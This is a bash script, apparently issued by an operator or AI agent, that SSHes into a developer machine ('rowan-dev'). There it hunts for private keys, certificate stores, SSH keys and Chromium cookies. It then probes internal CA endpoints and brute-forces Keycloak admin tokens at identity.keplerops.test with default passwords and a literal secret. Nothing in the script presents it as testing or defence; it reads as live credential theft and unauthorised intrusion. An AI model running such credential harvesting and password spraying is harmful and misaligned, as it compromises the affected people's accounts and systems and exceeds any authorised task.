set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
echo "=== CHROMIUM DIR ==="
ls -la /home/rowan/.config/chromium/Default/ 2>&1 | head -40
echo "=== NSS / PKI / P12 / KEYS ==="
find /home/rowan /etc /usr/local -maxdepth 6 \( -iname 'cert9.db' -o -iname 'key4.db' -o -iname '*.p12' -o -iname '*.pfx' -o -iname '*client*key*' -o -iname 'id_*' \) 2>/dev/null | grep -v repos | head -40
grep -rIl 'BEGIN .*PRIVATE KEY' /home/rowan 2>/dev/null | head
echo "=== COOKIES ==="
python3 - <<'PY'
import sqlite3,shutil
try:
    shutil.copy('/home/rowan/.config/chromium/Default/Cookies','/tmp/c.db')
    c=sqlite3.connect('/tmp/c.db')
    for row in c.execute('select host_key,name,length(encrypted_value),substr(encrypted_value,1,3),expires_utc from cookies order by host_key'):
        print(row)
except Exception as e: print('ERR',e)
PY
echo "=== CA/CERT PROBES ==="
for H in ca cert; do for p in / /health /healthz /roots /root /api /1.0/roots /v1/roots /.well-known/est/cacerts /acme/directory /api/v1/certs /version; do
 code=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' "https://$H.keplerops.test$p"); echo "-- $H$p -> $code :: $(head -c 120 /tmp/o|tr '\n' ' ')"
done; done
echo "=== KEYCLOAK ADMIN TOKEN ATTEMPTS ==="
I=https://identity.keplerops.test
for r in master keplerops; do
 for u in admin maya.ranscombe rowan.ito; do
  for pw in admin password keplerops changeme sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk; do
   r2=$(curl -sSk -m 6 -o /tmp/o -w '%{http_code}' -d "grant_type=password&client_id=admin-cli&username=$u&password=$pw" "$I/realms/$r/protocol/openid-connect/token")
   ok=$(head -c 60 /tmp/o)
   if [ "$r2" = "200" ]; then echo "SUCCESS realm=$r user=$u pw=$pw :: $ok"; cp /tmp/o /tmp/kc_$r.json; fi
  done
 done
done
echo "done attempts"
echo "=== KEYCLOAK TOKEN EXCHANGE PUBLIC? ==="
curl -sSk -m 6 -o /tmp/o -w '%{http_code}\n' -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange&client_id=admin-cli' "$I/realms/keplerops/protocol/openid-connect/token"; head -c 300 /tmp/o; echo
echo "=== UMA2 ==="
curl -sSk -m 8 "$I/realms/keplerops/.well-known/uma2-configuration" | head -c 600; echo
RSH
echo DONE_K14_R21
